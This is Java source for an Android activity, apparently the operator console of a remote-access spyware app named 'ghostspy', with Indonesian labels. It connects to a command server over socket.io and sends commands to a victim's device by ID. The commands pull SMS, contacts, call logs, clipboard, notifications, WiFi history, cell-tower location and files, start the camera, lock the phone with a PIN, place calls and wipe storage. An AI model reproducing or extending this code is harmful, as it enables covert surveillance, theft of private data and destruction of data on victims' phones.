package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deviceId = getIntent().getStringExtra("deviceId");
        String model = getIntent().getStringExtra("deviceModel");
        String battery = getIntent().getStringExtra("battery");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFF080808);
        layout.setPadding(16, 16, 16, 16);

        // Top bar
        LinearLayout topBar = new LinearLayout(this);
        topBar.setOrientation(LinearLayout.HORIZONTAL);
        topBar.setGravity(Gravity.CENTER_VERTICAL);
        topBar.setPadding(0, 0, 0, 16);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        topBar.addView(backBtn);

        TextView infoCapsule = new TextView(this);
        infoCapsule.setText(model + " | Bat: " + battery + "%");
        infoCapsule.setTextColor(0xFFFFFFFF);
        infoCapsule.setPadding(12, 8, 12, 8);
        infoCapsule.setBackgroundColor(0xFF151515);
        LinearLayout.LayoutParams capsParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        capsParams.setMargins(12, 0, 12, 0);
        infoCapsule.setLayoutParams(capsParams);
        infoCapsule.setGravity(Gravity.CENTER);
        topBar.addView(infoCapsule);

        TextView notifBadge = new TextView(this);
        notifBadge.setText("2");
        notifBadge.setTextColor(0xFFFFFFFF);
        notifBadge.setBackgroundColor(0xFFFF1744);
        notifBadge.setPadding(10, 4, 10, 4);
        topBar.addView(notifBadge);
        layout.addView(topBar);

        // Grid 4 kolom
        LinearLayout grid = new LinearLayout(this);
        grid.setOrientation(LinearLayout.VERTICAL);
        String[][] items = {
            {"📷", "Kamera", "#FF1744", "start_camera"},
            {"💬", "SMS Baru", "#FF4D8D", "get_sms"},
            {"👥", "Kontak", "#00E676", "get_contacts"},
            {"📞", "Panggilan", "#FFC107", "get_calls"},
            {"📋", "Clipboard", "#2ED8FF", "get_clipboard"},
            {"📦", "Aplikasi", "#2196F3", "get_apps"},
            {"🌐", "Jaringan", "#9C27B0", "get_network"},
            {"🔔", "Notifikasi", "#FF9800", "get_notifications"},
            {"📶", "WiFi Scan", "#00BCD4", "wifiscan"},
            {"🕒", "WiFi Hist", "#3F51B5", "wifihistory"},
            {"📡", "Cell Tower", "#607D8B", "celltower"},
            {"📁", "File Mgr", "#FF5722", "list_files"}
        };

        LinearLayout row = null;
        for (int i = 0; i < items.length; i++) {
            if (i % 3 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                grid.addView(row);
            }
            String[] item = items[i];
            TextView card = new TextView(this);
            card.setText(item[0] + "\n" + item[1]);
            card.setTextColor(0xFFFFFFFF);
            card.setGravity(Gravity.CENTER);
            card.setBackgroundColor((int) Long.parseLong(item[2].substring(1), 16) | 0x22000000);
            card.setPadding(8, 18, 8, 18);
            LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 130, 1);
            p.setMargins(6, 6, 6, 6);
            card.setLayoutParams(p);
            card.setOnClickListener(v -> handleAction(item[3]));
            row.addView(card);
        }
        layout.addView(grid);

        // Pusat Kontrol Button
        Button controlCenterBtn = new Button(this);
        controlCenterBtn.setText("🎛️ Pusat Kontrol");
        controlCenterBtn.setTextColor(0xFFFFFFFF);
        controlCenterBtn.setBackgroundColor(0xFFFF1744);
        controlCenterBtn.setOnClickListener(v -> showControlCenterPopup());
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        btnParams.setMargins(0, 24, 0, 0);
        controlCenterBtn.setLayoutParams(btnParams);
        layout.addView(controlCenterBtn);

        setContentView(layout);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {
            Toast.makeText(this, "Socket error", Toast.LENGTH_SHORT).show();
        }
    }

    private void handleAction(String cmd) {
        Intent intent = null;
        switch (cmd) {
            case "start_camera":
                intent = new Intent(this, CameraActivity.class);
                break;
            case "get_sms":
                intent = new Intent(this, SmsActivity.class);
                break;
            // Tambahkan case lain nanti
        }
        if (intent != null) {
            intent.putExtra("deviceId", deviceId);
            startActivity(intent);
        } else {
            // Kirim perintah biasa
            sendCmd(cmd, new JSONObject());
        }
    }

    private void showControlCenterPopup() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🎛️ Pusat Kontrol");
        LinearLayout popupLayout = new LinearLayout(this);
        popupLayout.setOrientation(LinearLayout.VERTICAL);
        popupLayout.setPadding(16, 16, 16, 16);

        String[][] controls = {
            {"🌐", "Buka Website", "Remote browsing target", "openurl"},
            {"🔦", "Nyalakan Flash", "Kontrol flashlight", "flashlight"},
            {"📳", "Getarkan", "Vibrate custom", "vibrate"},
            {"💬", "Teks Layar", "Tampilkan toast", "toast"},
            {"🔊", "Kirim Suara", "Text-to-Speech", "speak"},
            {"🔒", "Kunci HP", "Lock target PIN", "lock"},
            {"🔓", "Unlock HP", "Buka kunci", "unlock"},
            {"📞", "Panggil", "Trigger call", "call"},
            {"🖼️", "Ubah Wallpaper", "Set dari URL", "wallpaper"},
            {"🎵", "Putar Musik", "Play audio URL", "playmusic"},
            {"📶", "Lag Sinyal", "Atur game", "lagsignal"},
            {"🔔", "Notifikasi", "Push notification", "notify"},
            {"🗑️", "Hapus File", "Wipe storage", "wipe"}
        };

        LinearLayout row = null;
        for (int i = 0; i < controls.length; i++) {
            if (i % 2 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                popupLayout.addView(row);
            }
            String[] ctrl = controls[i];
            LinearLayout card = new LinearLayout(this);
            card.setOrientation(LinearLayout.VERTICAL);
            card.setPadding(12, 12, 12, 12);
            card.setBackgroundColor(0xFF151515);
            LinearLayout.LayoutParams cp = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
            cp.setMargins(4, 4, 4, 4);
            card.setLayoutParams(cp);
            card.setGravity(Gravity.CENTER);

            TextView iconView = new TextView(this);
            iconView.setText(ctrl[0]);
            iconView.setTextSize(24);
            iconView.setGravity(Gravity.CENTER);

            TextView titleView = new TextView(this);
            titleView.setText(ctrl[1]);
            titleView.setTextColor(0xFFFFFFFF);
            titleView.setTextSize(14);
            titleView.setTypeface(null, android.graphics.Typeface.BOLD);
            titleView.setGravity(Gravity.CENTER);

            TextView descView = new TextView(this);
            descView.setText(ctrl[2]);
            descView.setTextColor(0xFF9AA3B2);
            descView.setTextSize(11);
            descView.setGravity(Gravity.CENTER);

            Button btn = new Button(this);
            btn.setText("▶ Jalankan");
            btn.setTextColor(0xFFFFFFFF);
            btn.setBackgroundColor(0xFFFF1744);
            btn.setOnClickListener(v -> {
                sendCmd(ctrl[3], new JSONObject());
            });

            card.addView(iconView);
            card.addView(titleView);
            card.addView(descView);
            card.addView(btn);
            row.addView(card);
        }

        builder.setView(popupLayout);
        builder.setNegativeButton("Tutup", null);
        builder.show();
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
        }
    }

    private void showInputDialog(String title, InputCallback callback) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        EditText input = new EditText(this);
        builder.setView(input);
        builder.setPositiveButton("OK", (d, w) -> callback.onInput(input.getText().toString()));
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    interface InputCallback { void onInput(String input); }
}
